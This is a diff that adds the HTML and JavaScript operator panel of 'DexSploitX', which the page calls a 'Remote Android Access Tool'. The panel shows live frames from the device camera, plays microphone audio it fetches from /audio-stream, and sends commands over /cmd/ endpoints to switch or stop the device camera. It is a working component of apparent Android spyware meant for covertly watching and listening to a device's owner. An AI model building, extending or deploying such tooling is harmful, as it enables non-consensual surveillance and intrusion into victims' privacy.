@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DexSploitX - Live Camera Stream</title>
+    <style>
+        body {
+            background: #0d0d0d;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        h1 {
+            text-align: center;
+            color: #00ff00;
+            text-shadow: 0 0 15px #00ff00;
+            margin-bottom: 10px;
+        }
+        #status {
+            margin: 10px 0;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            min-width: 400px;
+            text-align: center;
+            font-size: 18px;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        #fps {
+            margin: 8px 0;
+            font-size: 16px;
+            color: #00cc00;
+        }
+        #videoContainer {
+            position: relative;
+            border: 3px solid #00ff00;
+            padding: 10px;
+            background: #000;
+            box-shadow: 0 0 30px #00ff00;
+            border-radius: 10px;
+            margin: 20px 0;
+            max-width: 700px;
+            width: 100%;
+        }
+        #cameraFeed {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 5px;
+        }
+        #noSignal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            opacity: 0;
+            transition: opacity 0.5s;
+            pointer-events: none;
+        }
+        #noSignal.active {
+            opacity: 1;
+        }
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 0 15px #00ff00;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #00cc00;
+            transform: scale(1.05);
+        }
+        #stopBtn {
+            background: #ff0000;
+            color: white;
+        }
+        #stopBtn:hover {
+            background: #cc0000;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        #micBtn {
+            background: #00cc00;
+            color: white;
+        }
+        #micBtn.muted {
+            background: #ff6600;
+        }
+        footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #006600;
+        }
+    </style>
+</head>
+<body>
+    <h1>📹 DexSploitX - Live Camera Stream</h1>
+    <div id="status">Status: Connecting...</div>
+    <div id="fps">FPS: --</div>
+
+    <div id="videoContainer">
+        <img id="cameraFeed" src="/frame" alt="Live Camera Feed">
+        <div id="noSignal">NO SIGNAL</div>
+    </div>
+
+    <div class="controls">
+        <button id="micBtn" onclick="toggleMic()">🎤 Mute Mic</button>
+        <button id="stopBtn" onclick="stopStream()">⏹ Stop Stream</button>
+    </div>
+
+    <footer>DexSploitX - Remote Android Access Tool</footer>
+
+    <script>
+        const img = document.getElementById('cameraFeed');
+        const noSignal = document.getElementById('noSignal');
+        const statusDiv = document.getElementById('status');
+        const fpsDiv = document.getElementById('fps');
+
+        let frameCount = 0;
+        let startTime = Date.now();
+        let lastFrameTime = 0;
+        let currentCamera = 'back'; // default
+        let audioContext = null;
+        let audioQueue = [];
+        let isPlaying = false;
+        let isMuted = false; // Start unmuted
+        let gainNode = null;
+        let audioInitialized = false;
+
+        // Initialize Web Audio API
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                // Create gain node for volume control
+                gainNode = audioContext.createGain();
+                gainNode.gain.value = 1.0;
+                gainNode.connect(audioContext.destination);
+                startAudioPlayback();
+            }
+        }
+
+        function startAudioPlayback() {
+            setInterval(() => {
+                if (!isMuted) {
+                    fetch('/audio-stream')
+                        .then(response => response.arrayBuffer())
+                        .then(data => {
+                            if (data.byteLength > 0) {
+                                playAudio(data);
+                            }
+                        })
+                        .catch(() => {});
+                }
+            }, 100);
+        }
+
+        function playAudio(arrayBuffer) {
+            if (isMuted || !audioContext || !gainNode) return;
+
+            // Convert PCM to Float32
+            const pcmData = new Int16Array(arrayBuffer);
+            const floatData = new Float32Array(pcmData.length);
+            for (let i = 0; i < pcmData.length; i++) {
+                floatData[i] = pcmData[i] / 32768.0;
+            }
+
+            // Create audio buffer
+            const audioBuffer = audioContext.createBuffer(1, floatData.length, 16000);
+            audioBuffer.getChannelData(0).set(floatData);
+
+            // Play audio with gain control
+            const source = audioContext.createBufferSource();
+            source.buffer = audioBuffer;
+            source.connect(gainNode);
+            source.start();
+        }
+
+        function toggleMic() {
+            isMuted = !isMuted;
+            const micBtn = document.getElementById('micBtn');
+            if (isMuted) {
+                micBtn.textContent = '🔇 Unmute Mic';
+                micBtn.classList.add('muted');
+                statusDiv.textContent = 'Streaming: ' + currentCamera.toUpperCase() + ' Camera (Audio Muted)';
+            } else {
+                micBtn.textContent = '🎤 Mute Mic';
+                micBtn.classList.remove('muted');
+                statusDiv.textContent = 'Streaming: ' + currentCamera.toUpperCase() + ' Camera';
+                if (!audioContext) initAudio();
+            }
+        }
+
+        function updateFrame() {
+            const now = Date.now();
+            if (now - lastFrameTime > 33) { // ~30 FPS max request rate
+                img.src = '/frame?t=' + now;
+                lastFrameTime = now;
+            }
+            requestAnimationFrame(updateFrame);
+        }
+
+        img.onload = () => {
+            noSignal.classList.remove('active');
+            frameCount++;
+            const elapsed = (Date.now() - startTime) / 1000;
+            if (elapsed > 1) {
+                fpsDiv.textContent = 'FPS: ' + Math.round(frameCount / elapsed);
+                frameCount = 0;
+                startTime = Date.now();
+            }
+        };
+
+        img.onerror = () => {
+            noSignal.classList.add('active');
+            setTimeout(() => {
+                img.src = '/frame?t=' + Date.now();
+            }, 500);
+        };
+
+        function switchCamera(camera) {
+            currentCamera = camera;
+            statusDiv.textContent = `Switching to ${camera} camera...`;
+            fetch(`/cmd/${camera}`).then(response => {
+                if (response.ok) {
+                    statusDiv.textContent = `Streaming: ${camera.toUpperCase()} Camera`;
+                }
+            }).catch(err => {
+                statusDiv.textContent = 'Error switching camera';
+            });
+        }
+
+        function stopStream() {
+            statusDiv.textContent = 'Stopping camera stream...';
+            fetch('/cmd/stop').then(response => {
+                if (response.ok) {
+                    statusDiv.textContent = 'Stream Stopped - Camera and audio stopped on device';
+                    noSignal.classList.add('active');
+                    fpsDiv.textContent = 'FPS: --';
+                    isMuted = true;
+                    const micBtn = document.getElementById('micBtn');
+                    micBtn.textContent = '🔇 Unmute Mic';
+                    micBtn.classList.add('muted');
+                    // Stop audio context
+                    if (audioContext) {
+                        audioContext.close();
+                        audioContext = null;
+                        audioInitialized = false;
+                    }
+                }
+            }).catch(err => {
+                statusDiv.textContent = 'Error stopping stream: ' + err.message;
+            });
+        }
+
+        // Start streaming updates
+        updateFrame();
+        statusDiv.textContent = 'Streaming: ' + currentCamera.toUpperCase() + ' Camera';
+        
+        // Auto-initialize audio immediately
+        setTimeout(() => {
+            if (!audioInitialized) {
+                initAudio();
+                audioInitialized = true;
+                isMuted = false;
+            }
+        }, 100);
+        
+        // Fallback: Initialize audio on user interaction
+        document.addEventListener('click', () => {
+            if (!audioInitialized) {
+                initAudio();
+                audioInitialized = true;
+                isMuted = false;
+            }
+        }, { once: true });
+    </script>
+</body>
+</html>
